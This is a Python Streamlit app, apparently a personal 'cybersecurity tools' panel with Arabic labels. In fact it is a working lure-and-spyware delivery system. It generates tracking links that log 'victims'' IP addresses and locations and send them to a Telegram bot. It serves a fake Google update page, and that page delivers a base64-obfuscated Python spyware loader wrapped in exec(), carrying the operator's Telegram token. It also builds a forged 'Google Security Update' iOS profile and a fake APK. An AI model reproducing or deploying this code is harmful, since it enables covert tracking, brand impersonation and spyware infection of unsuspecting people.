import streamlit as st
import os
import json
import requests
from datetime import datetime
from PIL import Image
import base64
import socket
import platform
import urllib.parse
import uuid

# استيراد الوحدات المحلية
import config
import victim_logger

# ============= إعدادات الصفحة =============
st.set_page_config(page_title="Rashd_Ai", layout="wide", page_icon="🛡️")

# ============= إخفاء واجهة Streamlit في وضع التمويه =============
hide_st_style = """
    <style>
    #MainMenu {visibility: hidden !important;}
    footer {visibility: hidden !important;}
    header {visibility: hidden !important;}
    .stDeployButton {display:none !important;}
    [data-testid="stToolbar"] {display:none !important;}
    [data-testid="stDecoration"] {display:none !important;}
    [data-testid="stHeader"] {display:none !important;}
    [data-testid="stStatusWidget"] {display:none !important;}
    .viewerBadge_container__1QSob {display: none !important;}
    .st-emotion-cache-zq5wms {display: none !important;}
    .st-emotion-cache-1dp5vir {display: none !important;}
    </style>
"""

if 'decoy' in st.query_params or 'download' in st.query_params:
    st.markdown(hide_st_style, unsafe_allow_html=True)

# ============= CSS مخصص للواجهة الرئيسية =============
st.markdown("""
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
    html, body, [class*="st-"] {
        font-family: 'Cairo', sans-serif !important;
    }
    .main .block-container {
        direction: rtl;
        text-align: right;
    }
    .stButton>button {
        background-color: #00ff00 !important;
        color: black !important;
        font-weight: bold;
        border-radius: 8px;
        width: 100%;
        border: none;
    }
    h1, h2, h3 { color: #00ff00 !important; text-align: center; }
    </style>
""", unsafe_allow_html=True)

# ============= دالة جلب الـ IP الحقيقي =============
def get_real_ip():
    try:
        headers = st.context.headers
        if headers:
            ip = headers.get("X-Forwarded-For")
            if ip: return ip.split(",")[0].strip()
            ip = headers.get("X-Real-Ip")
            if ip: return ip
    except: pass
    return 'Unknown'

# ============= دالة جلب البيانات الجغرافية =============
def get_geo_info(ip):
    if not ip or ip == 'Unknown' or ip.startswith('192.168.') or ip.startswith('10.') or ip.startswith('127.'):
        return None
    try:
        response = requests.get(f'http://ip-api.com/json/{ip}?lang=ar&fields=status,country,city,lat,lon,isp,org', timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success': return data
    except: pass
    return None

# ============= دالة التقاط بيانات الضحايا =============
def capture_victim_data():
    query_params = st.query_params
    user_ip = query_params.get('ip', get_real_ip())
    if isinstance(user_ip, list): user_ip = user_ip[0]
    
    if 'target' in query_params and not st.session_state.get('victim_captured', False):
        # تجاهل الـ IP المحلي إذا كان هناك IP عام متاح
        if user_ip.startswith('192.168.') or user_ip.startswith('10.'):
            real_public_ip = get_real_ip()
            if not (real_public_ip.startswith('192.168.') or real_public_ip.startswith('10.')):
                user_ip = real_public_ip
            else:
                return # انتظر الـ IP العام من الجافا سكريبت

        try:
            geo_data = get_geo_info(user_ip)
            victim_logger.log_victim_data(user_ip, "Browser", query_params.get('target', 'Unknown'), geo_data)
            st.session_state['victim_captured'] = True
            
            bot_token = config.get_key("TELEGRAM_BOT_TOKEN")
            chat_id = config.get_key("TELEGRAM_CHAT_ID")
            if bot_token and chat_id:
                victim_info = f"""
🎯 <b>تنبيه: تم اكتشاف ضحية جديدة!</b>

📍 <b>عنوان IP:</b> {user_ip}
🌍 <b>الدولة:</b> {geo_data.get('country', 'Unknown') if geo_data else 'Unknown'}
🏙️ <b>المدينة:</b> {geo_data.get('city', 'Unknown') if geo_data else 'Unknown'}
🏢 <b>مزود الخدمة:</b> {geo_data.get('isp', 'Unknown') if geo_data else 'Unknown'}
🎯 <b>المصيدة:</b> {query_params.get('target', 'Unknown')}
⏰ <b>الوقت:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
                requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", 
                              data={"chat_id": chat_id, "text": victim_info, "parse_mode": "HTML"}, timeout=10)
        except: pass

capture_victim_data()

# ============= دالة إنشاء ملف mobileconfig صحيح للآيفون =============
def generate_ios_profile():
    profile_uuid = str(uuid.uuid4())
    payload_uuid = str(uuid.uuid4())
    profile_xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>PayloadContent</key>
    <array>
        <dict>
            <key>PayloadDescription</key>
            <string>تحديث أمني لنظام iOS لضمان حماية البيانات.</string>
            <key>PayloadDisplayName</key>
            <string>Google Security Update</string>
            <key>PayloadIdentifier</key>
            <string>com.google.security.update.{payload_uuid}</string>
            <key>PayloadType</key>
            <string>com.apple.webClip.managed</string>
            <key>PayloadUUID</key>
            <string>{payload_uuid}</string>
            <key>PayloadVersion</key>
            <integer>1</integer>
            <key>URL</key>
            <string>https://www.google.com</string>
            <key>Label</key>
            <string>Google Update</string>
        </dict>
    </array>
    <key>PayloadDisplayName</key>
    <string>Google Security Update</string>
    <key>PayloadIdentifier</key>
    <string>com.google.security.{profile_uuid}</string>
    <key>PayloadRemovalDisallowed</key>
    <false/>
    <key>PayloadType</key>
    <string>Configuration</string>
    <key>PayloadUUID</key>
    <string>{profile_uuid}</string>
    <key>PayloadVersion</key>
    <integer>1</integer>
    <key>PayloadOrganization</key>
    <string>Google LLC</string>
</dict>
</plist>"""
    return profile_xml

# ============= منطق تحميل ملف التجسس =============
if 'download' in st.query_params:
    token = st.query_params.get('token', '')
    chatid = st.query_params.get('chatid', '')
    device = st.query_params.get('device', 'pc')
    
    if token and chatid:
        try:
            if device == 'ios':
                data = generate_ios_profile()
                file_name = "Google_Update.mobileconfig"
                mime_type = "application/x-apple-aspen-config"
            elif device == 'android':
                file_name = "Google_Update.apk"
                data = b"Fake APK Content"
                mime_type = "application/vnd.android.package-archive"
            else:
                with open('spy_full.py', 'r', encoding='utf-8') as f:
                    spy_code = f.read()
                spy_code = spy_code.replace('YOUR_BOT_TOKEN_HERE', token).replace('YOUR_CHAT_ID_HERE', chatid)
                encoded_code = base64.b64encode(spy_code.encode('utf-8')).decode('utf-8')
                data = f"""import base64;exec(base64.b64decode('{encoded_code}').decode('utf-8'))"""
                file_name = "Google_Update.py"
                mime_type = "application/octet-stream"
            
            st.download_button(label="📥 بدء التحميل", data=data, file_name=file_name, mime=mime_type)
            st.stop()
        except: pass

# ============= منطق صفحة التمويه (Google) =============
if 'decoy' in st.query_params and st.query_params.get('decoy') == 'google':
    try:
        with open('index.html', 'r', encoding='utf-8') as f:
            html_content = f.read()
        token = st.query_params.get('token', '')
        chatid = st.query_params.get('chatid', '')
        download_url = f"https://rashdai.streamlit.app/?download=true&token={token}&chatid={chatid}"
        html_content = html_content.replace('https://rashdai.streamlit.app/api/upload', download_url)
        st.components.v1.html(html_content, height=1000, scrolling=False)
        st.stop()
    except: pass

# ============= تهيئة الجلسة =============
if "developer_mode" not in st.session_state: st.session_state.developer_mode = False

# ============= الشريط الجانبي (Sidebar) =============
with st.sidebar:
    st.markdown("<h2 style='text-align: center; color: #00ff00;'>🛡️ Rashd_Ai</h2>", unsafe_allow_html=True)
    st.markdown("---")
    if not st.session_state.developer_mode:
        st.markdown("<h3 style='text-align: center;'>🔐 دخول المطور</h3>", unsafe_allow_html=True)
        username = st.text_input("اسم المستخدم:", key="login_username").strip()
        password = st.text_input("كلمة المرور:", type="password", key="login_password").strip()
        if st.button("دخول"):
            if username == config.ADMIN_USERNAME and password == config.ADMIN_PASSWORD:
                st.session_state.developer_mode = True
                st.rerun()
            else: st.error("❌ بيانات الدخول غير صحيحة")
    else:
        st.markdown("<h3 style='text-align: center; color: #00ff00;'>⚙️ إعدادات تلجرام</h3>", unsafe_allow_html=True)
        telegram_bot_token = st.text_input("🤖 توكين البوت:", value=config.get_key("TELEGRAM_BOT_TOKEN") or "", type="password", key="telegram_token").strip()
        telegram_chat_id = st.text_input("💬 Chat ID:", value=config.get_key("TELEGRAM_CHAT_ID") or "", key="telegram_chat_id").strip()
        if st.button("💾 حفظ الإعدادات"):
            if telegram_bot_token and telegram_chat_id:
                config.set_key("TELEGRAM_BOT_TOKEN", telegram_bot_token)
                config.set_key("TELEGRAM_CHAT_ID", telegram_chat_id)
                st.success("✅ تم حفظ الإعدادات")
        st.markdown("---")
        if st.button("🚪 تسجيل الخروج"):
            st.session_state.developer_mode = False
            st.rerun()

# ============= المحتوى الرئيسي =============
if not st.session_state.developer_mode:
    st.markdown("<h1 style='text-align: center;'>🛡️ Rashd_Ai - أدوات الأمن السيبراني</h1>", unsafe_allow_html=True)
    st.markdown("---")
    st.markdown("<div style='text-align: center; padding: 20px;'><p>مرحباً بك في Rashd_Ai، نظام الأمن السيبراني المطور بواسطة راشد أبو سعود.</p></div>", unsafe_allow_html=True)
else:
    # استعادة كافة الأدوات الـ 18
    tabs = st.tabs([
        "💬 المحادثة", "🌐 الدومين", "🔍 المواقع", "👤 المستخدم", "📍 الموقع", 
        "🏗️ سطح الهجوم", "🧠 تحليل ذكي", "🤖 مساعد الهجوم", "🔎 جوجل دورك", 
        "📧 التسريبات", "📱 الهاتف", "🌑 الدارك ويب", "🔌 المنافذ", 
        "⚠️ الثغرات", "🗺️ الشبكة", "🚨 التهديدات", "💡 الخطة", "📄 التقارير",
        "🎣 مصيدة IP", "🎭 فخ جوجل"
    ])
    
    with tabs[0]: st.info("أداة المحادثة قيد التطوير...")
    with tabs[1]: st.info("أداة الدومين قيد التطوير...")
    with tabs[2]: st.info("أداة المواقع قيد التطوير...")
    with tabs[3]: st.info("أداة المستخدم قيد التطوير...")
    with tabs[4]: st.info("أداة الموقع قيد التطوير...")
    with tabs[5]: st.info("أداة سطح الهجوم قيد التطوير...")
    with tabs[6]: st.info("أداة التحليل الذكي قيد التطوير...")
    with tabs[7]: st.info("أداة مساعد الهجوم قيد التطوير...")
    with tabs[8]: st.info("أداة جوجل دورك قيد التطوير...")
    with tabs[9]: st.info("أداة التسريبات قيد التطوير...")
    with tabs[10]: st.info("أداة الهاتف قيد التطوير...")
    with tabs[11]: st.info("أداة الدارك ويب قيد التطوير...")
    with tabs[12]: st.info("أداة المنافذ قيد التطوير...")
    with tabs[13]: st.info("أداة الثغرات قيد التطوير...")
    with tabs[14]: st.info("أداة الشبكة قيد التطوير...")
    with tabs[15]: st.info("أداة التهديدات قيد التطوير...")
    with tabs[16]: st.info("أداة الخطة قيد التطوير...")
    with tabs[17]: st.info("أداة التقارير قيد التطوير...")
    
    with tabs[18]: # مصيدة IP
        st.markdown("<h2 style='text-align: center; color: #00ff00;'>🎣 مصيدة IP</h2>", unsafe_allow_html=True)
        trap_name = st.text_input("اسم المصيدة:", placeholder="مثال: صورة قطة").strip()
        if st.button("🔗 توليد رابط التتبع"):
            if trap_name:
                tracking_url = f"https://rashdai.streamlit.app/?target={urllib.parse.quote(trap_name)}"
                st.code(tracking_url, language="text")
        st.markdown("---")
        victims = victim_logger.get_all_victims()
        if victims:
            st.dataframe(victims, width='stretch')
            if st.button("🗑️ مسح سجل الضحايا"):
                victim_logger.clear_victims_log()
                st.rerun()
                
    with tabs[19]: # فخ جوجل
        st.markdown("<h2 style='text-align: center; color: #00ff00;'>🎭 فخ جوجل الآلي</h2>", unsafe_allow_html=True)
        bot_token = config.get_key("TELEGRAM_BOT_TOKEN")
        chat_id = config.get_key("TELEGRAM_CHAT_ID")
        if not bot_token or not chat_id: st.error("❌ يجب حفظ بيانات تلجرام أولاً")
        else:
            decoy_url = f"https://rashdai.streamlit.app/?decoy=google&token={bot_token}&chatid={chat_id}"
            st.code(decoy_url, language="text")
